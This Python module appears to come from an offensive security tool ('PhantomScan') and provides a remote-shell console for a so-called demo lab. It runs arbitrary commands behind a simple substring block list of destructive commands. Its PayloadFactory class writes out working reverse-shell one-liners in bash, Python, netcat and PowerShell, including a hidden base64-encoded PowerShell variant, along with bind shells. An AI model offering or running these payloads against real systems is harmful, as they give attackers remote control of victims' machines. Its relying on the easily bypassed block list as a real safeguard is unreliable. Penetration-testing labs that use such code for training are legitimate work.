"""Interactive shell handler for Brutal Mode.

A shell session represents a foothold on a compromised host. In the
PhantomBank demo the "compromised host" is the lab running on the same machine
as PhantomScan, so commands execute locally through a guarded subprocess.

Guards (never optional):
- dangerous-destructive command filter (rm -rf, format, shutdown, ...),
- per-shell command budget,
- per-command timeout,
- every command logged to the ``brutal_ops`` table.

The same executor backs the REST console endpoint and the WebSocket console.
"""

import asyncio
import logging
import os
import platform
import subprocess
import sys
import time
import uuid
from dataclasses import dataclass, field

from app.config import get_settings
from app.database import create_brutal_op, update_brutal_op

logger = logging.getLogger("phantomscan.brutal_shell")

DANGEROUS_PATTERNS = [
    "rm -rf",
    "rm -fr",
    "del /s",
    "rd /s",
    "format ",
    "mkfs",
    "dd if=",
    "shutdown",
    "reboot",
    "halt",
    "init 0",
    "init 6",
    ":(){ :|:& };:",
    "> /dev/sda",
    "chkdsk",
    "diskpart",
    "poweroff",
]

MAX_OUTPUT_CHARS = 20_000


@dataclass
class ShellSession:
    """A single interactive shell session."""

    shell_id: str
    session_id: str
    target_url: str
    actor: str
    os_hint: str
    created_at: float
    closed: bool = False
    command_count: int = 0
    commands: list[dict] = field(default_factory=list)
    last_output: str = ""
    last_exit_code: int | None = None

    def remaining_budget(self) -> int:
        limit = get_settings().brutal_max_commands_per_shell
        return max(0, limit - self.command_count)


def is_dangerous(command: str) -> bool:
    lowered = command.strip().lower()
    return any(pattern in lowered for pattern in DANGEROUS_PATTERNS)


def _build_cmd(command: str) -> list[str]:
    """Build a shell command invocation appropriate for the host OS."""
    if platform.system() == "Windows":
        return ["cmd.exe", "/d", "/c", command]
    return ["/bin/sh", "-c", command]


async def run_command(shell: ShellSession, command: str) -> dict:
    """Execute a command in the shell session with full guarding + logging."""
    if shell.closed:
        return {"error": "shell session is closed", "exit_code": -1}
    if not command.strip():
        return {"error": "empty command", "exit_code": -1}
    if shell.remaining_budget() <= 0:
        return {"error": "command budget exhausted", "exit_code": -1}
    if is_dangerous(command):
        await create_brutal_op(
            shell.session_id,
            shell.target_url,
            shell.actor,
            "shell_command_blocked",
            status="denied",
            detail=f"Dangerous command filtered: {command[:300]}",
        )
        return {"error": "command blocked by destructive-operation filter", "exit_code": -1}

    timeout = get_settings().brutal_command_timeout
    shell.command_count += 1
    started = time.monotonic()
    op_id = await create_brutal_op(
        shell.session_id,
        shell.target_url,
        shell.actor,
        "shell_command",
        status="running",
        detail=command[:4000],
        payload=command[:8000],
    )
    try:
        process = await asyncio.create_subprocess_exec(
            *_build_cmd(command),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            cwd=None,
        )
        stdout_bytes, _ = await asyncio.wait_for(process.communicate(), timeout=timeout)
        output = stdout_bytes.decode("utf-8", errors="replace")[:MAX_OUTPUT_CHARS]
        exit_code = process.returncode if process.returncode is not None else 0
    except asyncio.TimeoutError:
        output = f"[command timed out after {timeout:.0f}s]"
        exit_code = -1
        try:
            process.kill()
        except Exception:
            pass
    except Exception as exc:
        output = f"[execution error: {exc}]"
        exit_code = -1

    shell.last_output = output
    shell.last_exit_code = exit_code
    shell.commands.append(
        {
            "command": command,
            "output": output,
            "exit_code": exit_code,
            "duration_ms": int((time.monotonic() - started) * 1000),
        }
    )
    await update_brutal_op(
        op_id,
        status="completed" if exit_code == 0 else "failed",
        output=output[:12000],
    )
    return {"output": output, "exit_code": exit_code, "duration_ms": int((time.monotonic() - started) * 1000)}


class PayloadFactory:
    """Generates OS-specific reverse shell one-liners for the UI."""

    @staticmethod
    def reverse_shell_payloads(listener_host: str = "127.0.0.1", listener_port: int = 4444) -> list[dict]:
        return [
            {
                "os": "bash",
                "label": "Bash /dev/tcp",
                "payload": f"bash -i >& /dev/tcp/{listener_host}/{listener_port} 0>&1",
            },
            {
                "os": "python",
                "label": "Python 3 one-liner",
                "payload": (
                    f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"
                    f"socket.SOCK_STREAM);s.connect((\"{listener_host}\",{listener_port}));"
                    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    f"subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
            },
            {
                "os": "netcat",
                "label": "Netcat",
                "payload": f"nc -e /bin/sh {listener_host} {listener_port}",
            },
            {
                "os": "powershell",
                "label": "PowerShell (Windows)",
                "payload": (
                    f"$c=New-Object System.Net.Sockets.TCPClient('{listener_host}',{listener_port});"
                    f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                    f"{{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';"
                    f"$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);"
                    f"$s.Flush()}};$c.Close()"
                ),
            },
            {
                "os": "powershell",
                "label": "PowerShell (hidden, obfuscated)",
                "payload": (
                    f"powershell -nop -w hidden -enc {_ps_base64(f'$c=New-Object Net.Sockets.TCPClient(\"{listener_host}\",{listener_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);iex $d;$d=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($d),0,$d.Length)}}')}"
                ),
            },
        ]

    @staticmethod
    def bind_shell_payloads() -> list[dict]:
        return [
            {
                "os": "bash",
                "label": "Bash bind shell (4444)",
                "payload": "nc -lvnp 4444 -e /bin/sh",
            },
            {
                "os": "python",
                "label": "Python bind shell (4444)",
                "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            },
        ]


def _ps_base64(text: str) -> str:
    import base64
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


class ShellSessionManager:
    """In-memory registry of active shell sessions."""

    _sessions: dict[str, ShellSession] = {}

    @classmethod
    def create(
        cls,
        session_id: str,
        target_url: str,
        actor: str,
        os_hint: str = "auto",
    ) -> ShellSession:
        shell = ShellSession(
            shell_id=uuid.uuid4().hex[:12],
            session_id=session_id,
            target_url=target_url,
            actor=actor,
            os_hint=os_hint or platform.system().lower(),
            created_at=time.time(),
        )
        cls._sessions[shell.shell_id] = shell
        return shell

    @classmethod
    def get(cls, shell_id: str) -> ShellSession | None:
        return cls._sessions.get(shell_id)

    @classmethod
    def list(cls, session_id: str | None = None) -> list[ShellSession]:
        if session_id is None:
            return list(cls._sessions.values())
        return [s for s in cls._sessions.values() if s.session_id == session_id]

    @classmethod
    def close(cls, shell_id: str) -> bool:
        shell = cls._sessions.get(shell_id)
        if shell is None:
            return False
        shell.closed = True
        return True

    @classmethod
    def serialize(cls, shell: ShellSession) -> dict:
        return {
            "shell_id": shell.shell_id,
            "session_id": shell.session_id,
            "target_url": shell.target_url,
            "os_hint": shell.os_hint,
            "created_at": shell.created_at,
            "closed": shell.closed,
            "command_count": shell.command_count,
            "remaining_budget": shell.remaining_budget(),
            "last_output": shell.last_output,
            "last_exit_code": shell.last_exit_code,
            "commands": shell.commands[-20:],
        }